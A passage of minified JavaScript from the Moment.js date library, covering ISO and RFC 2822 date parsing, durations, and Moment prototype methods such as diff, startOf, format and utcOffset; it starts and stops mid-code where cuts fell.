A._useUTC ? [p.getUTCFullYear(), p.getUTCMonth(), p.getUTCDate()] : [p.getFullYear(), p.getMonth(), p.getDate()]; for (t._w && null == t._a[Ct] && null == t._a[dt] && (null != (s = (a = t)._w).GG || null != s.W || null != s.E ? (g = 1, l = 4, h = Ie(s.GG, a._a[ht], Yt(Qe(), 1, 4).year), d = Ie(s.W, 1), ((r = Ie(s.E, 1)) < 1 || 7 < r) && (I = !0)) : (g = a._locale._week.dow, l = a._locale._week.doy, u = Yt(Qe(), g, l), h = Ie(s.gg, a._a[ht], u.year), d = Ie(s.w, u.week), null != s.d ? ((r = s.d) < 0 || 6 < r) && (I = !0) : null != s.e ? (r = s.e + g, (s.e < 0 || 6 < s.e) && (I = !0)) : r = g), d < 1 || d > Ot(h, g, l) ? b(a)._overflowWeeks = !0 : null != I ? b(a)._overflowWeekday = !0 : (c = Rt(h, d, r, g, l), a._a[ht] = c.year, a._dayOfYear = c.dayOfYear)), null != t._dayOfYear && (o = Ie(t._a[ht], m[ht]), (t._dayOfYear > yt(o) || 0 === t._dayOfYear) && (b(t)._overflowDayOfYear = !0), n = Ht(o, 0, t._dayOfYear), t._a[dt] = n.getUTCMonth(), t._a[Ct] = n.getUTCDate()), e = 0; e < 3 && null == t._a[e]; ++e)t._a[e] = C[e] = m[e]; for (; e < 7; e++)t._a[e] = C[e] = null == t._a[e] ? 2 === e ? 1 : 0 : t._a[e]; 24 === t._a[At] && 0 === t._a[pt] && 0 === t._a[mt] && 0 === t._a[ft] && (t._nextDay = !0, t._a[At] = 0), t._d = (t._useUTC ? Ht : function (t, e, n, i, o, a, s) { var r; return t < 100 && 0 <= t ? (r = new Date(t + 400, e, n, i, o, a, s), isFinite(r.getFullYear()) && r.setFullYear(t)) : r = new Date(t, e, n, i, o, a, s), r }).apply(null, C), i = t._useUTC ? t._d.getUTCDay() : t._d.getDay(), null != t._tzm && t._d.setUTCMinutes(t._d.getUTCMinutes() - t._tzm), t._nextDay && (t._a[At] = 24), t._w && void 0 !== t._w.d && t._w.d !== i && (b(t).weekdayMismatch = !0) } } var he = /^\s*((?:[+-]\d{6}|\d{4})-(?:\d\d-\d\d|W\d\d-\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?::\d\d(?::\d\d(?:[.,]\d+)?)?)?)([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/, de = /^\s*((?:[+-]\d{6}|\d{4})(?:\d\d\d\d|W\d\d\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?:\d\d(?:\d\d(?:[.,]\d+)?)?)?)([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/, Ce = /Z|[+-]\d\d(?::?\d\d)?/, Ae = [["YYYYYY-MM-DD", /[+-]\d{6}-\d\d-\d\d/], ["YYYY-MM-DD", /\d{4}-\d\d-\d\d/], ["GGGG-[W]WW-E", /\d{4}-W\d\d-\d/], ["GGGG-[W]WW", /\d{4}-W\d\d/, !1], ["YYYY-DDD", /\d{4}-\d{3}/], ["YYYY-MM", /\d{4}-\d\d/, !1], ["YYYYYYMMDD", /[+-]\d{10}/], ["YYYYMMDD", /\d{8}/], ["GGGG[W]WWE", /\d{4}W\d{3}/], ["GGGG[W]WW", /\d{4}W\d{2}/, !1], ["YYYYDDD", /\d{7}/]], pe = [["HH:mm:ss.SSSS", /\d\d:\d\d:\d\d\.\d+/], ["HH:mm:ss,SSSS", /\d\d:\d\d:\d\d,\d+/], ["HH:mm:ss", /\d\d:\d\d:\d\d/], ["HH:mm", /\d\d:\d\d/], ["HHmmss.SSSS", /\d\d\d\d\d\d\.\d+/], ["HHmmss,SSSS", /\d\d\d\d\d\d,\d+/], ["HHmmss", /\d\d\d\d\d\d/], ["HHmm", /\d\d\d\d/], ["HH", /\d\d/]], me = /^\/?Date\((\-?\d+)/i; function fe(t) { var e, n, i, o, a, s, r = t._i, g = he.exec(r) || de.exec(r); if (g) { for (b(t).iso = !0, e = 0, n = Ae.length; e < n; e++)if (Ae[e][1].exec(g[1])) { o = Ae[e][0], i = !1 !== Ae[e][2]; break } if (null == o) return t._isValid = !1; if (g[3]) { for (e = 0, n = pe.length; e < n; e++)if (pe[e][1].exec(g[3])) { a = (g[2] || " ") + pe[e][0]; break } if (null == a) return t._isValid = !1 } if (!i && null != a) return t._isValid = !1; if (g[4]) { if (!Ce.exec(g[4])) return t._isValid = !1; s = "Z" } t._f = o + (a || "") + (s || ""), ve(t) } else t._isValid = !1 } var be = /^(?:(Mon|Tue|Wed|Thu|Fri|Sat|Sun),?\s)?(\d{1,2})\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s(\d{2,4})\s(\d\d):(\d\d)(?::(\d\d))?\s(?:(UT|GMT|[ECMP][SD]T)|([Zz])|([+-]\d{4}))$/; var Be = { UT: 0, GMT: 0, EDT: -240, EST: -300, CDT: -300, CST: -360, MDT: -360, MST: -420, PDT: -420, PST: -480 }; function ye(t) { var e, n, i, o, a, s, r, g, l = be.exec(t._i.replace(/\([^)]*\)|[\n\t]/g, " ").replace(/(\s\s+)/g, " ").replace(/^\s\s*/, "").replace(/\s\s*$/, "")); if (l) { var c, I = (e = l[4], n = l[3], i = l[2], o = l[5], a = l[6], s = l[7], g = [(r = parseInt(e, 10)) <= 49 ? 2e3 + r : r <= 999 ? 1900 + r : r, Dt.indexOf(n), parseInt(i, 10), parseInt(o, 10), parseInt(a, 10)], s && g.push(parseInt(s, 10)), g), u = I, h = t; if ((c = l[1]) && Lt.indexOf(c) !== new Date(u[0], u[1], u[2]).getDay() && (b(h).weekdayMismatch = !0, !(h._isValid = !1))) return; t._a = I, t._tzm = function (t, e, n) { if (t) return Be[t]; if (e) return 0; var i = parseInt(n, 10), o = i % 100; return (i - o) / 100 * 60 + o }(l[8], l[9], l[10]), t._d = Ht.apply(null, t._a), t._d.setUTCMinutes(t._d.getUTCMinutes() - t._tzm), b(t).rfc2822 = !0 } else t._isValid = !1 } function ve(t) { if (t._f !== f.ISO_8601) if (t._f !== f.RFC_2822) { t._a = [], b(t).empty = !0; for (var e, n, i, o, a, s, r = "" + t._i, g = r.length, l = 0, c = V(t._f, t._locale).match(H) || [], I = 0; I < c.length; I++)n = c[I], (e = (r.match((p = t, m(rt, A = n) ? rt[A](p._strict, p._locale) : new RegExp(lt(A.replace("\\", "").replace(/\\(\[)|\\(\])|\[([^\]\[]*)\]|\\(.)/g, function (t, e, n, i, o) { return e || n || i || o }))))) || [])[0]) && (0 < (i = r.substr(0, r.indexOf(e))).length && b(t).unusedInput.push(i), r = r.slice(r.indexOf(e) + e.length), l += e.length), Y[n] ? (e ? b(t).empty = !1 : b(t).unusedTokens.push(n), o = n, s = t, null != (a = e) && m(ct, o) && ct[o](a, s._a, s, o)) : t._strict && !e && b(t).unusedTokens.push(n); b(t).charsLeftOver = g - l, 0 < r.length && b(t).unusedInput.push(r), t._a[At] <= 12 && !0 === b(t).bigHour && 0 < t._a[At] && (b(t).bigHour = void 0), b(t).parsedDateParts = t._a.slice(0), b(t).meridiem = t._meridiem, t._a[At] = (u = t._locale, h = t._a[At], null == (d = t._meridiem) ? h : null != u.meridiemHour ? u.meridiemHour(h, d) : (null != u.isPM && ((C = u.isPM(d)) && h < 12 && (h += 12), C || 12 !== h || (h = 0)), h)), ue(t), ce(t) } else ye(t); else fe(t); var u, h, d, C, A, p } function xe(t) { var e, n, i, o, a, s, r = t._i, g = t._f; return t._locale = t._locale || le(t._l), null === r || void 0 === g && "" === r ? B({ nullInput: !0 }) : ("string" == typeof r && (t._i = r = t._locale.preparse(r)), x(r) ? new v(ce(r)) : (h(r) ? t._d = r : l(g) ? function (t) { var e, n, i, o, a; if (0 === t._f.length) return b(t).invalidFormat = !0, t._d = new Date(NaN); for (o = 0; o < t._f.length; o++)a = 0, e = y({}, t), null != t._useUTC && (e._useUTC = t._useUTC), e._f = t._f[o], ve(e), p(e) && (a += b(e).charsLeftOver, a += 10 * b(e).unusedTokens.length, b(e).score = a, (null == i || a < i) && (i = a, n = e)); C(t, n || e) }(t) : g ? ve(t) : I(n = (e = t)._i) ? e._d = new Date(f.now()) : h(n) ? e._d = new Date(n.valueOf()) : "string" == typeof n ? (i = e, null === (o = me.exec(i._i)) ? (fe(i), !1 === i._isValid && (delete i._isValid, ye(i), !1 === i._isValid && (delete i._isValid, f.createFromInputFallback(i)))) : i._d = new Date(+o[1])) : l(n) ? (e._a = d(n.slice(0), function (t) { return parseInt(t, 10) }), ue(e)) : c(n) ? (a = e)._d || (s = U(a._i), a._a = d([s.year, s.month, s.day || s.date, s.hour, s.minute, s.second, s.millisecond], function (t) { return t && parseInt(t, 10) }), ue(a)) : u(n) ? e._d = new Date(n) : f.createFromInputFallback(e), p(t) || (t._d = null), t)) } function Fe(t, e, n, i, o) { var a, s = {}; return !0 !== n && !1 !== n || (i = n, n = void 0), (c(t) && function (t) { if (Object.getOwnPropertyNames) return 0 === Object.getOwnPropertyNames(t).length; var e; for (e in t) if (t.hasOwnProperty(e)) return; return 1 }(t) || l(t) && 0 === t.length) && (t = void 0), s._isAMomentObject = !0, s._useUTC = s._isUTC = o, s._l = n, s._i = t, s._f = e, s._strict = i, (a = new v(ce(xe(s))))._nextDay && (a.add(1, "d"), a._nextDay = void 0), a } function Qe(t, e, n, i) { return Fe(t, e, n, i, !1) } f.createFromInputFallback = n("value provided is not in a recognized RFC2822 or ISO format. moment construction falls back to js Date(), which is not reliable across all browsers and versions. Non RFC2822/ISO date formats are discouraged and will be removed in an upcoming major release. Please refer to https://momentjs.com/guides/#/warnings/js-date/ for more info.", function (t) { t._d = new Date(t._i + (t._useUTC ? " UTC" : "")) }), f.ISO_8601 = function () { }, f.RFC_2822 = function () { }; var Ge = n("moment().min is deprecated, use moment.max instead. https://momentjs.com/guides/#/warnings/min-max/", function () { var t = Qe.apply(null, arguments); return this.isValid() && t.isValid() ? t < this ? this : t : B() }), we = n("moment().max is deprecated, use moment.min instead. https://momentjs.com/guides/#/warnings/min-max/", function () { var t = Qe.apply(null, arguments); return this.isValid() && t.isValid() ? this < t ? this : t : B() }); function Xe(t, e) { var n, i; if (1 === e.length && l(e[0]) && (e = e[0]), !e.length) return Qe(); for (n = e[0], i = 1; i < e.length; ++i)e[i].isValid() && !e[i][t](n) || (n = e[i]); return n } var Se = ["year", "quarter", "month", "week", "day", "hour", "minute", "second", "millisecond"]; function ke(t) { var e = U(t), n = e.year || 0, i = e.quarter || 0, o = e.month || 0, a = e.week || e.isoWeek || 0, s = e.day || 0, r = e.hour || 0, g = e.minute || 0, l = e.second || 0, c = e.millisecond || 0; this._isValid = function (t) { for (var e in t) if (-1 === xt.call(Se, e) || null != t[e] && isNaN(t[e])) return !1; for (var n = !1, i = 0; i < Se.length; ++i)if (t[Se[i]]) { if (n) return !1; parseFloat(t[Se[i]]) !== Q(t[Se[i]]) && (n = !0) } return !0 }(e), this._milliseconds = +c + 1e3 * l + 6e4 * g + 1e3 * r * 60 * 60, this._days = +s + 7 * a, this._months = +o + 3 * i + 12 * n, this._data = {}, this._locale = le(), this._bubble() } function De(t) { return t instanceof ke } function Ze(t) { return t < 0 ? -1 * Math.round(-1 * t) : Math.round(t) } function Ue(t, n) { O(t, 0, 0, function () { var t = this.utcOffset(), e = "+"; return t < 0 && (t = -t, e = "-"), e + T(~~(t / 60), 2) + n + T(~~t % 60, 2) }) } Ue("Z", ":"), Ue("ZZ", ""), gt("Z", at), gt("ZZ", at), It(["Z", "ZZ"], function (t, e, n) { n._useUTC = !0, n._tzm = Ne(at, t) }); var We = /([\+\-]|\d\d)/gi; function Ne(t, e) { var n = (e || "").match(t); if (null === n) return null; var i = ((n[n.length - 1] || []) + "").match(We) || ["-", 0, 0], o = 60 * i[1] + Q(i[2]); return 0 === o ? 0 : "+" === i[0] ? o : -o } function Te(t, e) { var n, i; return e._isUTC ? (n = e.clone(), i = (x(t) || h(t) ? t.valueOf() : Qe(t).valueOf()) - n.valueOf(), n._d.setTime(n._d.valueOf() + i), f.updateOffset(n, !1), n) : Qe(t).local() } function He(t) { return 15 * -Math.round(t._d.getTimezoneOffset() / 15) } function Ee() { return !!this.isValid() && this._isUTC && 0 === this._offset } f.updateOffset = function () { }; var Re = /^(\-|\+)?(?:(\d*)[. ])?(\d+)\:(\d+)(?:\:(\d+)(\.\d*)?)?$/, Ye = /^(-|\+)?P(?:([-+]?[0-9,.]*)Y)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)W)?(?:([-+]?[0-9,.]*)D)?(?:T(?:([-+]?[0-9,.]*)H)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)S)?)?$/; function Oe(t, e) { var n, i, o, a, s, r, g = t, l = null; return De(t) ? g = { ms: t._milliseconds, d: t._days, M: t._months } : u(t) ? (g = {}, e ? g[e] = t : g.milliseconds = t) : (l = Re.exec(t)) ? (n = "-" === l[1] ? -1 : 1, g = { y: 0, d: Q(l[Ct]) * n, h: Q(l[At]) * n, m: Q(l[pt]) * n, s: Q(l[mt]) * n, ms: Q(Ze(1e3 * l[ft])) * n }) : (l = Ye.exec(t)) ? (n = "-" === l[1] ? -1 : 1, g = { y: _e(l[2], n), M: _e(l[3], n), w: _e(l[4], n), d: _e(l[5], n), h: _e(l[6], n), m: _e(l[7], n), s: _e(l[8], n) }) : null == g ? g = {} : "object" == typeof g && ("from" in g || "to" in g) && (a = Qe(g.from), s = Qe(g.to), o = a.isValid() && s.isValid() ? (s = Te(s, a), a.isBefore(s) ? r = Ve(a, s) : ((r = Ve(s, a)).milliseconds = -r.milliseconds, r.months = -r.months), r) : { milliseconds: 0, months: 0 }, (g = {}).ms = o.milliseconds, g.M = o.months), i = new ke(g), De(t) && m(t, "_locale") && (i._locale = t._locale), i } function _e(t, e) { var n = t && parseFloat(t.replace(",", ".")); return (isNaN(n) ? 0 : n) * e } function Ve(t, e) { var n = {}; return n.months = e.month() - t.month() + 12 * (e.year() - t.year()), t.clone().add(n.months, "M").isAfter(e) && --n.months, n.milliseconds = e - t.clone().add(n.months, "M"), n } function Le(i, o) { return function (t, e) { var n; return null === e || isNaN(+e) || (G(o, "moment()." + o + "(period, number) is deprecated. Please use moment()." + o + "(number, period). See https://momentjs.com/guides/#/warnings/add-inverted-param/ for more info."), n = t, t = e, e = n), Me(this, Oe(t = "string" == typeof t ? +t : t, e), i), this } } function Me(t, e, n, i) { var o = e._milliseconds, a = Ze(e._days), s = Ze(e._months); t.isValid() && (i = null == i || i, s && Zt(t, Gt(t, "Month") + s * n), a && wt(t, "Date", Gt(t, "Date") + a * n), o && t._d.setTime(t._d.valueOf() + o * n), i && f.updateOffset(t, a || s)) } Oe.fn = ke.prototype, Oe.invalid = function () { return Oe(NaN) }; var ze = Le(1, "add"), Pe = Le(-1, "subtract"); function Ke(t, e) { var n = 12 * (e.year() - t.year()) + (e.month() - t.month()), i = t.clone().add(n, "months"); return -(n + (e - i < 0 ? (e - i) / (i - t.clone().add(n - 1, "months")) : (e - i) / (t.clone().add(1 + n, "months") - i))) || 0 } function Je(t) { var e; return void 0 === t ? this._locale._abbr : (null != (e = le(t)) && (this._locale = e), this) } f.defaultFormat = "YYYY-MM-DDTHH:mm:ssZ", f.defaultFormatUtc = "YYYY-MM-DDTHH:mm:ss[Z]"; var je = n("moment().lang() is deprecated. Instead, use moment().localeData() to get the language configuration. Use moment().locale() to change languages.", function (t) { return void 0 === t ? this.localeData() : this.locale(t) }); function $e() { return this._locale } var qe = 126227808e5; function tn(t, e) { return (t % e + e) % e } function en(t, e, n) { return t < 100 && 0 <= t ? new Date(t + 400, e, n) - qe : new Date(t, e, n).valueOf() } function nn(t, e, n) { return t < 100 && 0 <= t ? Date.UTC(t + 400, e, n) - qe : Date.UTC(t, e, n) } function on(t, e) { O(0, [t, t.length], 0, e) } function an(t, e, n, i, o) { var a; return null == t ? Yt(this, i, o).year : ((a = Ot(t, i, o)) < e && (e = a), function (t, e, n, i, o) { var a = Rt(t, e, n, i, o), s = Ht(a.year, 0, a.dayOfYear); return this.year(s.getUTCFullYear()), this.month(s.getUTCMonth()), this.date(s.getUTCDate()), this }.call(this, t, e, n, i, o)) } O(0, ["gg", 2], 0, function () { return this.weekYear() % 100 }), O(0, ["GG", 2], 0, function () { return this.isoWeekYear() % 100 }), on("gggg", "weekYear"), on("ggggg", "weekYear"), on("GGGG", "isoWeekYear"), on("GGGGG", "isoWeekYear"), D("weekYear", "gg"), D("isoWeekYear", "GG"), N("weekYear", 1), N("isoWeekYear", 1), gt("G", it), gt("g", it), gt("GG", J, M), gt("gg", J, M), gt("GGGG", tt, P), gt("gggg", tt, P), gt("GGGGG", et, K), gt("ggggg", et, K), ut(["gggg", "ggggg", "GGGG", "GGGGG"], function (t, e, n, i) { e[i.substr(0, 2)] = Q(t) }), ut(["gg", "GG"], function (t, e, n, i) { e[i] = f.parseTwoDigitYear(t) }), O("Q", 0, "Qo", "quarter"), D("quarter", "Q"), N("quarter", 7), gt("Q", L), It("Q", function (t, e) { e[dt] = 3 * (Q(t) - 1) }), O("D", ["DD", 2], "Do", "date"), D("date", "D"), N("date", 9), gt("D", J), gt("DD", J, M), gt("Do", function (t, e) { return t ? e._dayOfMonthOrdinalParse || e._ordinalParse : e._dayOfMonthOrdinalParseLenient }), It(["D", "DD"], Ct), It("Do", function (t, e) { e[Ct] = Q(t.match(J)[0]) }); var sn = Qt("Date", !0); O("DDD", ["DDDD", 3], "DDDo", "dayOfYear"), D("dayOfYear", "DDD"), N("dayOfYear", 4), gt("DDD", q), gt("DDDD", z), It(["DDD", "DDDD"], function (t, e, n) { n._dayOfYear = Q(t) }), O("m", ["mm", 2], 0, "minute"), D("minute", "m"), N("minute", 14), gt("m", J), gt("mm", J, M), It(["m", "mm"], pt); var rn = Qt("Minutes", !1); O("s", ["ss", 2], 0, "second"), D("second", "s"), N("second", 15), gt("s", J), gt("ss", J, M), It(["s", "ss"], mt); var gn, ln = Qt("Seconds", !1); for (O("S", 0, 0, function () { return ~~(this.millisecond() / 100) }), O(0, ["SS", 2], 0, function () { return ~~(this.millisecond() / 10) }), O(0, ["SSS", 3], 0, "millisecond"), O(0, ["SSSS", 4], 0, function () { return 10 * this.millisecond() }), O(0, ["SSSSS", 5], 0, function () { return 100 * this.millisecond() }), O(0, ["SSSSSS", 6], 0, function () { return 1e3 * this.millisecond() }), O(0, ["SSSSSSS", 7], 0, function () { return 1e4 * this.millisecond() }), O(0, ["SSSSSSSS", 8], 0, function () { return 1e5 * this.millisecond() }), O(0, ["SSSSSSSSS", 9], 0, function () { return 1e6 * this.millisecond() }), D("millisecond", "ms"), N("millisecond", 16), gt("S", q, L), gt("SS", q, M), gt("SSS", q, z), gn = "SSSS"; gn.length <= 9; gn += "S")gt(gn, nt); function cn(t, e) { e[ft] = Q(1e3 * ("0." + t)) } for (gn = "S"; gn.length <= 9; gn += "S")It(gn, cn); var In = Qt("Milliseconds", !1); O("z", 0, 0, "zoneAbbr"), O("zz", 0, 0, "zoneName"); var un = v.prototype; function hn(t) { return t } un.add = ze, un.calendar = function (t, e) { var n = t || Qe(), i = Te(n, this).startOf("day"), o = f.calendarFormat(this, i) || "sameElse", a = e && (w(e[o]) ? e[o].call(this, n) : e[o]); return this.format(a || this.localeData().calendar(o, this, Qe(n))) }, un.clone = function () { return new v(this) }, un.diff = function (t, e, n) { var i, o, a; if (!this.isValid()) return NaN; if (!(i = Te(t, this)).isValid()) return NaN; switch (o = 6e4 * (i.utcOffset() - this.utcOffset()), e = Z(e)) { case "year": a = Ke(this, i) / 12; break; case "month": a = Ke(this, i); break; case "quarter": a = Ke(this, i) / 3; break; case "second": a = (this - i) / 1e3; break; case "minute": a = (this - i) / 6e4; break; case "hour": a = (this - i) / 36e5; break; case "day": a = (this - i - o) / 864e5; break; case "week": a = (this - i - o) / 6048e5; break; default: a = this - i }return n ? a : F(a) }, un.endOf = function (t) { var e; if (void 0 === (t = Z(t)) || "millisecond" === t || !this.isValid()) return this; var n = this._isUTC ? nn : en; switch (t) { case "year": e = n(this.year() + 1, 0, 1) - 1; break; case "quarter": e = n(this.year(), this.month() - this.month() % 3 + 3, 1) - 1; break; case "month": e = n(this.year(), this.month() + 1, 1) - 1; break; case "week": e = n(this.year(), this.month(), this.date() - this.weekday() + 7) - 1; break; case "isoWeek": e = n(this.year(), this.month(), this.date() - (this.isoWeekday() - 1) + 7) - 1; break; case "day": case "date": e = n(this.year(), this.month(), this.date() + 1) - 1; break; case "hour": e = this._d.valueOf(), e += 36e5 - tn(e + (this._isUTC ? 0 : 6e4 * this.utcOffset()), 36e5) - 1; break; case "minute": e = this._d.valueOf(), e += 6e4 - tn(e, 6e4) - 1; break; case "second": e = this._d.valueOf(), e += 1e3 - tn(e, 1e3) - 1 }return this._d.setTime(e), f.updateOffset(this, !0), this }, un.format = function (t) { t = t || (this.isUtc() ? f.defaultFormatUtc : f.defaultFormat); var e = _(this, t); return this.localeData().postformat(e) }, un.from = function (t, e) { return this.isValid() && (x(t) && t.isValid() || Qe(t).isValid()) ? Oe({ to: this, from: t }).locale(this.locale()).humanize(!e) : this.localeData().invalidDate() }, un.fromNow = function (t) { return this.from(Qe(), t) }, un.to = function (t, e) { return this.isValid() && (x(t) && t.isValid() || Qe(t).isValid()) ? Oe({ from: this, to: t }).locale(this.locale()).humanize(!e) : this.localeData().invalidDate() }, un.toNow = function (t) { return this.to(Qe(), t) }, un.get = function (t) { return w(this[t = Z(t)]) ? this[t]() : this }, un.invalidAt = function () { return b(this).overflow }, un.isAfter = function (t, e) { var n = x(t) ? t : Qe(t); return !(!this.isValid() || !n.isValid()) && ("millisecond" === (e = Z(e) || "millisecond") ? this.valueOf() > n.valueOf() : n.valueOf() < this.clone().startOf(e).valueOf()) }, un.isBefore = function (t, e) { var n = x(t) ? t : Qe(t); return !(!this.isValid() || !n.isValid()) && ("millisecond" === (e = Z(e) || "millisecond") ? this.valueOf() < n.valueOf() : this.clone().endOf(e).valueOf() < n.valueOf()) }, un.isBetween = function (t, e, n, i) { var o = x(t) ? t : Qe(t), a = x(e) ? e : Qe(e); return !!(this.isValid() && o.isValid() && a.isValid()) && ("(" === (i = i || "()")[0] ? this.isAfter(o, n) : !this.isBefore(o, n)) && (")" === i[1] ? this.isBefore(a, n) : !this.isAfter(a, n)) }, un.isSame = function (t, e) { var n, i = x(t) ? t : Qe(t); return !(!this.isValid() || !i.isValid()) && ("millisecond" === (e = Z(e) || "millisecond") ? this.valueOf() === i.valueOf() : (n = i.valueOf(), this.clone().startOf(e).valueOf() <= n && n <= this.clone().endOf(e).valueOf())) }, un.isSameOrAfter = function (t, e) { return this.isSame(t, e) || this.isAfter(t, e) }, un.isSameOrBefore = function (t, e) { return this.isSame(t, e) || this.isBefore(t, e) }, un.isValid = function () { return p(this) }, un.lang = je, un.locale = Je, un.localeData = $e, un.max = we, un.min = Ge, un.parsingFlags = function () { return C({}, b(this)) }, un.set = function (t, e) { if ("object" == typeof t) for (var n = function (t) { var e = []; for (var n in t) e.push({ unit: n, priority: W[n] }); return e.sort(function (t, e) { return t.priority - e.priority }), e }(t = U(t)), i = 0; i < n.length; i++)this[n[i].unit](t[n[i].unit]); else if (w(this[t = Z(t)])) return this[t](e); return this }, un.startOf = function (t) { var e; if (void 0 === (t = Z(t)) || "millisecond" === t || !this.isValid()) return this; var n = this._isUTC ? nn : en; switch (t) { case "year": e = n(this.year(), 0, 1); break; case "quarter": e = n(this.year(), this.month() - this.month() % 3, 1); break; case "month": e = n(this.year(), this.month(), 1); break; case "week": e = n(this.year(), this.month(), this.date() - this.weekday()); break; case "isoWeek": e = n(this.year(), this.month(), this.date() - (this.isoWeekday() - 1)); break; case "day": case "date": e = n(this.year(), this.month(), this.date()); break; case "hour": e = this._d.valueOf(), e -= tn(e + (this._isUTC ? 0 : 6e4 * this.utcOffset()), 36e5); break; case "minute": e = this._d.valueOf(), e -= tn(e, 6e4); break; case "second": e = this._d.valueOf(), e -= tn(e, 1e3) }return this._d.setTime(e), f.updateOffset(this, !0), this }, un.subtract = Pe, un.toArray = function () { return [this.year(), this.month(), this.date(), this.hour(), this.minute(), this.second(), this.millisecond()] }, un.toObject = function () { return { years: this.year(), months: this.month(), date: this.date(), hours: this.hours(), minutes: this.minutes(), seconds: this.seconds(), milliseconds: this.milliseconds() } }, un.toDate = function () { return new Date(this.valueOf()) }, un.toISOString = function (t) { if (!this.isValid()) return null; var e = !0 !== t, n = e ? this.clone().utc() : this; return n.year() < 0 || 9999 < n.year() ? _(n, e ? "YYYYYY-MM-DD[T]HH:mm:ss.SSS[Z]" : "YYYYYY-MM-DD[T]HH:mm:ss.SSSZ") : w(Date.prototype.toISOString) ? e ? this.toDate().toISOString() : new Date(this.valueOf() + 60 * this.utcOffset() * 1e3).toISOString().replace("Z", _(n, "Z")) : _(n, e ? "YYYY-MM-DD[T]HH:mm:ss.SSS[Z]" : "YYYY-MM-DD[T]HH:mm:ss.SSSZ") }, un.inspect = function () { if (!this.isValid()) return "moment.invalid(/* " + this._i + " */)"; var t = "moment", e = ""; this.isLocal() || (t = 0 === this.utcOffset() ? "moment.utc" : "moment.parseZone", e = "Z"); var n = "[" + t + '("]', i = 0 <= this.year() && this.year() <= 9999 ? "YYYY" : "YYYYYY", o = e + '[")]'; return this.format(n + i + "-MM-DD[T]HH:mm:ss.SSS" + o) }, un.toJSON = function () { return this.isValid() ? this.toISOString() : null }, un.toString = function () { return this.clone().locale("en").format("ddd MMM DD YYYY HH:mm:ss [GMT]ZZ") }, un.unix = function () { return Math.floor(this.valueOf() / 1e3) }, un.valueOf = function () { return this._d.valueOf() - 6e4 * (this._offset || 0) }, un.creationData = function () { return { input: this._i, format: this._f, locale: this._locale, isUTC: this._isUTC, strict: this._strict } }, un.year = Ft, un.isLeapYear = function () { return vt(this.year()) }, un.weekYear = function (t) { return an.call(this, t, this.week(), this.weekday(), this.localeData()._week.dow, this.localeData()._week.doy) }, un.isoWeekYear = function (t) { return an.call(this, t, this.isoWeek(), this.isoWeekday(), 1, 4) }, un.quarter = un.quarters = function (t) { return null == t ? Math.ceil((this.month() + 1) / 3) : this.month(3 * (t - 1) + this.month() % 3) }, un.month = Ut, un.daysInMonth = function () { return Xt(this.year(), this.month()) }, un.week = un.weeks = function (t) { var e = this.localeData().week(this); return null == t ? e : this.add(7 * (t - e), "d") }, un.isoWeek = un.isoWeeks = function (t) { var e = Yt(this, 1, 4).week; return null == t ? e : this.add(7 * (t - e), "d") }, un.weeksInYear = function () { var t = this.localeData()._week; return Ot(this.year(), t.dow, t.doy) }, un.isoWeeksInYear = function () { return Ot(this.year(), 1, 4) }, un.date = sn, un.day = un.days = function (t) { if (!this.isValid()) return null != t ? this : NaN; var e, n, i = this._isUTC ? this._d.getUTCDay() : this._d.getDay(); return null != t ? (e = t, n = this.localeData(), t = "string" != typeof e ? e : isNaN(e) ? "number" == typeof (e = n.weekdaysParse(e)) ? e : null : parseInt(e, 10), this.add(t - i, "d")) : i }, un.weekday = function (t) { if (!this.isValid()) return null != t ? this : NaN; var e = (this.day() + 7 - this.localeData()._week.dow) % 7; return null == t ? e : this.add(t - e, "d") }, un.isoWeekday = function (t) { if (!this.isValid()) return null != t ? this : NaN; if (null == t) return this.day() || 7; var e, n, i = (e = t, n = this.localeData(), "string" == typeof e ? n.weekdaysParse(e) % 7 || 7 : isNaN(e) ? null : e); return this.day(this.day() % 7 ? i : i - 7) }, un.dayOfYear = function (t) { var e = Math.round((this.clone().startOf("day") - this.clone().startOf("year")) / 864e5) + 1; return null == t ? e : this.add(t - e, "d") }, un.hour = un.hours = ee, un.minute = un.minutes = rn, un.second = un.seconds = ln, un.millisecond = un.milliseconds = In, un.utcOffset = function (t, e, n) { var i, o = this._offset || 0; if (!this.isValid()) return null != t ? this : NaN; if (null == t) return this._isUTC ? o : He(this); if ("string" == typeof t) { if (null === (t = Ne(at, t))) return this } else Math.abs(t) < 16 && !n && (t *= 60); return !this._isUTC && e && (i = He(this)), this._offset = t, this._isUTC = !0, null != i && this.add(i, "m"), o !== t && (!e || this._changeInProgress ? Me(this, Oe(t - o, "m"), 1, !1) : this._changeInProgress || (this._changeInProgress = !0, f.updateOffset(this, !0), this._changeInProgress = null)), this }, un.utc = function (t) { return this.utcOffset(0, t) }, un.local = function (t) { return this._isUTC && (this.utcOffset(0, t), this._isUTC = !1, t && this.subtract(He(this), "m")), this }, un.parseZone = function () { var t; return null != this._tzm ? this.utcOffset(this._tzm, !1, !0) : "string" == typeof this._i && (null != (t = Ne(ot, this._i)) ? this.utcOffset(t) : this.utcOffset(0, !0)), this }, un.hasAlignedHourOffset = function (t) { return !!this.isValid() && (t = t ? Qe(t).utcOffset() : 0, (this.utcOffset() - t) % 60 == 0) }, un.isDST = function () { return this.utcOffset() > this.clone().month(0).utcOffset() || this.utcOffset() > this.clone().month(5).utcOffset() }, un.isLocal = function () { return !!this.isValid() && !this._isUTC }, un.isUtcOffset = function () { return !!this.isValid() && this._isUTC }, un.isUtc = Ee, un.isUTC = Ee, un.zoneAbbr = function () { return this._isUTC ? "UTC" : "" }, un.zoneName = function () { return this._isUTC ? "Coordinated Universal Time" : "" }, un.dates = n("dates accessor is deprecated. Use date instead.", sn), un.months = n("months accessor is deprecated. Use month instead", Ut), un.years = n("years accessor is deprecated. Use year instead", Ft), un.zone = n("moment().zone is deprecated, use moment().utcOffset instead. https://momentjs.com/guides/#/warnings/zone/", function (t, e) { return null != t ? ("string" != typeof t && (t = -t), this.utcOffset(t, e), this) : -this.utcOffset() }), un.isDSTShifted = n("isDSTShifted is deprecated. See https://momentjs.com/guides/#/warnings/dst-shifted/ for more information", function () { if (!I(this._isDSTShifted)) return this._isDSTShifted; var t, 